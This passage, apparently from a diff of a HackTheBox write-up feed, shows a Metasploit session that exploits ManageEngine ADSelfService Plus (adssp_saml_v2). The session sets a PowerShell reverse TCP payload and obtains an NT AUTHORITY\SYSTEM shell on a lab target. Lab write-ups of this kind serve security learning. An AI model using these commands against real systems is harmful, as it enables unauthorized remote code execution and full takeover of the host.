+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set AutoCheck false
+</span></span><span style="display:flex;"><span>AutoCheck <span style="color:#f92672">=</span>&gt; false
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set payload cmd/windows/powershell_reverse_tcp
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; cmd/windows/powershell_reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set LHOST 10.10.16.151
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; 10.10.16.151
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">4448</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">4448</span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.16.151:4448
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> AutoCheck is disabled, proceeding with exploitation
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Powershell session session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.16.151:4448 -&gt; 10.129.232.100:54996<span style="color:#f92672">)</span> at 2026-11-04 01:44:11 -0500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\M</span>anageEngine<span style="color:#ae81ff">\A</span>DSelfService Plus<span style="color:#ae81ff">\b</span>in&gt; whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\M</span>anageEngine<span style="color:#ae81ff">\A</span>DSelfService Plus<span style="color:#ae81ff">\b</span>in&gt; exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 127.0.0.1 - Powershell session session <span style="color:#ae81ff">1</span> closed.  Reason: User exit
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; exit
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>HTB-AuthorityWriteup</title>
